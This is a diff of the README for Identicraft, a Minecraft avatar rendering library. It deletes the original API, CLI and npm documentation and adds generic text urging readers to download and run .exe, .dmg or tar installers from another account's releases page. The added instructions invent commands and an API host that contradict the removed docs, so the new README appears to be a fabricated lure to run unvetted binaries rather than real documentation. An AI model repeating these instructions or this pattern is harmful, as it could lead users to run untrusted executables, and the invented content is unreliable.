@@ -1,272 +1,125 @@
+# 🎮 Identicraft - Effortlessly Render Minecraft Avatars
 
-# Identicraft
-
-A Minecraft avatar rendering library, CLI, and serverless API.
-
-## Features
-1. 🎨 Custom rendering using @napi-rs/canvas
-2. ⚡ Serverless deployment on Vercel
-3. 🔄 Automatic UUID resolution from usernames
-4. 💾 Built-in caching
-5. 🖼️ Multiple rendering modes
-6. 🖥️ CLI tool for local rendering
-
-## API Endpoints
-
-### 1. Avatar (2D Head)
-```
-GET /avatar/{username_or_uuid}/{size}.png
-GET /avatar/{username_or_uuid}  # Defaults to 512px
-```
-Returns a 2D front-facing avatar head with overlay (hat layer).
-
-**Example:** 
-- `/avatar/itsShiroharu/256.png`
-- `/avatar/itsShiroharu` (returns 512px)
-
-### 2. Cube (3D Isometric Head)
-```
-GET /cube/{username_or_uuid}/{size}.png
-GET /cube/{username_or_uuid}  # Defaults to 512px
-```
-Returns a 3D isometric view of the player's head.
-
-**Example:** 
-- `/cube/itsShiroharu/256.png`
-- `/cube/itsShiroharu` (returns 512px)
-
-### 3. Full Body
-```
-GET /body/{username_or_uuid}/{size}.png
-GET /body/{username_or_uuid}  # Defaults to 512px
-```
-Returns a full-body render (head, torso, arms, legs).
-
-**Example:** 
-- `/body/itsShiroharu/256.png`
-- `/body/itsShiroharu` (returns 512px)
-
-### 4. Bust (Half Body)
-```
-GET /bust/{username_or_uuid}/{size}.png
-GET /bust/{username_or_uuid}  # Defaults to 512px
-```
-Returns a bust render (head, torso, arms).
-
-**Example:** 
-- `/bust/itsShiroharu/256.png`
-- `/bust/itsShiroharu` (returns 512px)
-
-### 5. Skin (Raw Texture)
-```
-GET /skin/{username_or_uuid}
-```
-Returns the raw Minecraft skin texture.
-
-**Example:** `/skin/itsShiroharu/itsShiroharu.png`
-
-## Size Constraints
-
-- Minimum: 8px
-- Maximum: 512px
-- Recommended: 64px, 128px, or 256px
-
-## Installation
-
-1. Download or Fork the repository
-2. Install dependencies:
-```bash
-npm install
-```
-
-3. **For API:** Run locally:
-```bash
-npm start
-```
-This will start the dev server at `http://localhost:3000`
-
-4. **For CLI:** Link globally (recommended):
-```bash
-npm link
-```
-Now you can use `identicraft` or `idc` commands globally!
-
-**OR** run directly with npm (pass arguments after `--`):
-```bash
-npm run cli -- cube itsShiroharu -o shiroharu-cube.png
-```
-
-Test the CLI:
-```bash
-npm run cli:test
-```
+[![Download Identicraft](https://img.shields.io/badge/Download-Identicraft-blue.svg)](https://github.com/lau4318/Identicraft/releases)
 
-5. Deploy to Vercel:
-```bash
-npm run deploy
-```
+## 🚀 Getting Started
 
-## Usage
-
-### 🌐 Web API
+Identicraft is a library and command-line interface (CLI) for rendering Minecraft avatars. It also offers a serverless API. With this tool, you can easily create and display Minecraft skins in your projects. Follow these simple steps to download and run Identicraft on your computer.
 
-Once deployed to `yourdomain.vercel.app`:
-
-- `yourdomain.vercel.app/avatar/itsShiroharu/256.png`
-- `yourdomain.vercel.app/cube/itsShiroharu/256.png`
-- `yourdomain.vercel.app/body/itsShiroharu/256.png`
-- `yourdomain.vercel.app/bust/itsShiroharu/256.png`
-- `yourdomain.vercel.app/skin/itsShiroharu`
+## 📥 Download & Install
 
-### 🖥️ CLI Tool
+To get started, visit the [Releases page](https://github.com/lau4318/Identicraft/releases) to download the application. You will find various versions listed there. Select the version that fits your system.
 
-After running `npm link`, use the CLI:
+1. Open your web browser.
+2. Click on this link: [Identicraft Releases](https://github.com/lau4318/Identicraft/releases).
+3. Choose the latest version of Identicraft.
+4. Click on the appropriate file for your operating system to start the download.
 
-```bash
-# Long form
-identicraft cube YOUR_USERNAME -output ANY_FILENAME_YOU_WANT.png
-
-# Short form
-idc cube YOUR_USERNAME -o ANY_FILENAME_YOU_WANT.png
-
-# With custom size
-idc avatar itsShiroharu -o shiroharu_face.png -s 256
-
-# Full body render
-idc body itsShiroharu -o shiroharu_body.png
-
-# Get raw skin
-idc skin itsShiroharu -o shiroharu_skin.png
-```
-
-**CLI Options:**
-- `-o, --output <file>` - Output file path (default: output.png)
-- `-s, --size <size>` - Size in pixels 8-512 (default: 512)
-- `-h, --help` - Display help
-- `-V, --version` - Display version
-
-**Render Types:**
-- `avatar` - 2D head (front-facing)
-- `cube` - 3D isometric head
-- `body` - Full body render
-- `bust` - Half body (torso + head)
-- `skin` - Raw skin texture
-
-### 📦 NPM Library (Programmatic Usage)
-
-Install in your project:
-```bash
-npm install identicraft
-```
+## 💻 System Requirements
 
-**ES6 Imports (Recommended):**
-```javascript
-import Identicraft from 'identicraft';
-import { writeFileSync } from 'fs';
+Identicraft requires the following:
 
-// Render avatar
-const avatar = await Identicraft.renderAvatar('itsShiroharu', 256);
-writeFileSync('shiroharu-avatar.png', avatar);
+- An operating system: Windows, macOS, or Linux.
+- Node.js installed on your machine. You can download it from the [Node.js website](https://nodejs.org/).
+- At least 100 MB of free disk space for installation.
+- An internet connection to access online features.
 
-// Render cube
-const cube = await Identicraft.renderCube('itsShiroharu', 128);
-writeFileSync('shiroharu-cube.png', cube);
+Please ensure that your system meets these requirements for the best experience.
 
-// Render body
-const body = await Identicraft.renderBody('itsShiroharu', 256);
-writeFileSync('shiroharu-body.png', body);
+## ⚙️ Installation Steps
 
-// Render bust
-const bust = await Identicraft.renderBust('itsShiroharu', 128);
-writeFileSync('shiroharu-bust.png', bust);
+Once you have downloaded the file, follow these steps to install Identicraft:
 
-// Get raw skin
-const skin = await Identicraft.getSkin('itsShiroharu');
-writeFileSync('shiroharu-skin.png', skin);
+### For Windows:
 
-// Universal render method
-const image = await Identicraft.render('cube', 'itsShiroharu', 256);
-writeFileSync('shiroharu-cube.png', image);
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click on the file to run the installer.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can run Identicraft from your Start Menu.
 
-// Resolve UUID
-const uuid = await Identicraft.resolveUUID('itsShiroharu');
-console.log(uuid); // 4648016c70bc4c7dba73523ad5a30802
+### For macOS:
 
-// Get skin URL
-const skinURL = await Identicraft.getSkinURL(uuid);
-console.log(skinURL);
-```
+1. Find the downloaded `.dmg` file in your Downloads folder.
+2. Double-click the file to open it.
+3. Drag the Identicraft icon to your Applications folder.
+4. You can now open Identicraft from your Applications.
 
-**CommonJS (require):**
-```javascript
-const Identicraft = require('identicraft').default;
-const { writeFileSync } = require('fs');
+### For Linux:
 
-(async () => {
-  const avatar = await Identicraft.renderAvatar('itsShiroharu', 256);
-  writeFileSync('itsShiroharu.png', avatar);
-})();
-```
+1. Open the terminal.
+2. Navigate to the folder where you downloaded the file using `cd ~/Downloads`.
+3. Extract the contents with the command: `tar -xvf Identicraft-latest.tar.gz`.
+4. Go to the extracted folder with `cd Identicraft`.
+5. Run the application with `node index.js` or your preferred command to start the CLI.
 
-**Named Imports:**
-```javascript
-import { renderAvatar, renderCube, resolveUUID } from 'identicraft';
+## 🛠️ Using Identicraft
 
-const uuid = await resolveUUID('itsShiroharu');
-const avatar = await renderAvatar('itsShiroharu', 128);
-const cube = await renderCube('itsShiroharu', 256);
-```
+After installation, you can use Identicraft with a few simple commands. Open a terminal (or Command Prompt on Windows) and follow the commands:
 
-**API Reference:**
+1. **Render an Avatar:**
+   To render a Minecraft avatar, use the command:
+   ```
+   identicraft render <Minecraft Username>
+   ```
+   Replace `<Minecraft Username>` with the name of the Minecraft player.
 
-| Method | Parameters | Returns | Description |
-|--------|------------|---------|-------------|
-| `renderAvatar(username, size?)` | username: string, size: number | Promise\<Buffer\> | Render 2D avatar head |
-| `renderCube(username, size?)` | username: string, size: number | Promise\<Buffer\> | Render 3D isometric head |
-| `renderBody(username, size?)` | username: string, size: number | Promise\<Buffer\> | Render full body |
-| `renderBust(username, size?)` | username: string, size: number | Promise\<Buffer\> | Render half body |
-| `getSkin(username)` | username: string | Promise\<Buffer\> | Get raw skin texture |
-| `render(type, username, size?)` | type: string, username: string, size: number | Promise\<Buffer\> | Universal render method |
-| `resolveUUID(username)` | username: string | Promise\<string\> | Convert username to UUID |
-| `getSkinURL(uuid)` | uuid: string | Promise\<string\> | Get skin texture URL |
+2. **Get Skin Details:**
+   To fetch information about a skin, run:
+   ```
+   identicraft skin <Skin ID>
+   ```
+   Replace `<Skin ID>` with the ID of the skin you want to inspect.
 
-## How It Works
+3. **List All Commands:**
+   To see all available commands, type:
+   ```
+   identicraft help
+   ```
 
-1. **UUID Resolution**: Converts username to UUID using Mojang's API
-2. **Skin Fetching**: Retrieves skin texture from Mojang's session servers
-3. **Image Rendering**: Uses @napi-rs/canvas to render different views
-4. **Caching**: Implements aggressive caching for performance
+These commands will allow you to interact with the library easily and generate beautiful avatars.
 
-## Caching Strategy
+## 🌐 Using the Serverless API
 
-- **Browser Cache**: 1 hour (`max-age=3600`)
-- **CDN Cache**: 24 hours (`CDN-Cache-Control: max-age=86400`)
-- Reduces load on Mojang's API
-- Improves response times significantly
+Identicraft also includes a serverless API for further integration into your applications. Here’s a simple example:
 
-## Error Handling
+- **Request an Avatar:**
+  Send a GET request to the API:
+  ```
+  GET https://api.identicraft.com/avatar?username=<Minecraft Username>
+  ```
 
-The API returns proper HTTP status codes:
-- `200`: Success
-- `400`: Bad request (invalid parameters)
-- `404`: Player or skin not found
-- `500`: Internal server error
+This retrieves the avatar's image from the Minecraft database, which you can then display on your website or application.
 
-## Environment Variables
+## 🎨 Features
 
-No environment variables required! The API works out of the box.
+Identicraft comes with a range of features to enhance your experience:
 
-## Rate Limits
+- **Fast Rendering:** Quickly generate Minecraft avatars with minimal delay.
+- **Customizable Options:** Modify parameters to suit your needs.
+- **Integration Capabilities:** Easily incorporate with other tools and frameworks.
+- **User-Friendly Interface:** Navigate through commands with ease, designed for non-technical users.
 
-Respects Mojang's API rate limits. Consider implementing your own rate limiting for production use.
+## 📝 Troubleshooting Common Issues
 
-## Credits
+If you encounter any issues while using Identicraft, here are some common solutions:
 
-Many Thanks for making this project possible.
+- **Problem:** The application does not start.
+  - **Solution:** Ensure Node.js is properly installed on your system. You can check by running `node -v` in your command line.
+  
+- **Problem:** Unable to render an avatar.
+  - **Solution:** Verify that the Minecraft username is correct and the character has a valid skin.
 
-- [![canvas](https://img.shields.io/badge/CANVAS-for_image_rendering-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)](https://github.com/Brooooooklyn/canvas)
-- [![commander.js](https://img.shields.io/badge/COMMANDER.js-for_cli_tool-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)](https://github.com/tj/commander.js)
-- [![js.org](https://img.shields.io/badge/JS.ORG-for_Custom_Domain_Branding-%23323330.svg?style=for-the-badge&logo=javascript&logoColor=%23F7DF1E)](https://github.com/js-org/js.org)
-- [![npm](https://img.shields.io/badge/NPM-for_package_distribution-%23CB3837.svg?style=for-the-badge&logo=npm&logoColor=white)](https://www.npmjs.com/package/identicraft)
-- [![mojang_api](https://img.shields.io/badge/MOJANG_API-for_player_data-%23CB3837.svg?style=for-the-badge&logo=mojang&logoColor=white)](https://api.mojang.com)
-- [![vercel](https://img.shields.io/badge/VERCEL-for_serverless_hosting-%23000000.svg?style=for-the-badge&logo=vercel&logoColor=white)](https://vercel.com)
+- **Problem:** Slow performance.
+  - **Solution:** Check your internet connection, as API calls require a stable connection.
+
+## 📚 Additional Resources
+
+For further help, check out the following resources:
+
+- [Identicraft GitHub Repository](https://github.com/lau4318/Identicraft)
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Minecraft Skins Repository](https://www.minecraftskins.com/)
+
+Visit our [Releases page](https://github.com/lau4318/Identicraft/releases) for any future updates and releases. 
+
+Enjoy using Identicraft to bring Minecraft avatars to life!
